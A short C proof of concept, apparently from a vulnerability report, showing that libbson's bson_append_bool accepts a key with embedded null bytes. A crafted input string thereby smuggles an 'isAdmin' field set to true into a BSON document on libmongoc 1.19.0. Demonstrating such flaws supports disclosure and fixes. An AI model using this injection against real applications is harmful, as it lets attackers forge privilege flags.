/* Compile with:
 * clang -o exploit.out exploit.c $(pkg-config --libs --cflags libmongoc-1.0)
 */

#include <mongoc/mongoc.h>

int main () {
    bson_t *embedded_null_key;
    bson_iter_t iter;
    const char* user_input = "key\x00\x01\x08isAdmin\x00\x01";
    int user_input_len = 15;

    mongoc_init ();
    
    /* Test a real-ish exploit. */
    embedded_null_key = bson_new ();
    bson_append_bool (embedded_null_key, user_input, user_input_len, true);
    if (bson_iter_init_find (&iter, embedded_null_key, "isAdmin") && BSON_ITER_HOLDS_BOOL (&iter)) {
        printf ("isAdmin=%d\n", bson_iter_bool (&iter));
    } else {
        printf ("isAdmin not found\n");
    }

    bson_destroy (embedded_null_key);

    mongoc_cleanup ();
}

/* On libmongoc 1.19.0, this outputs:
 * isAdmin=1
 */
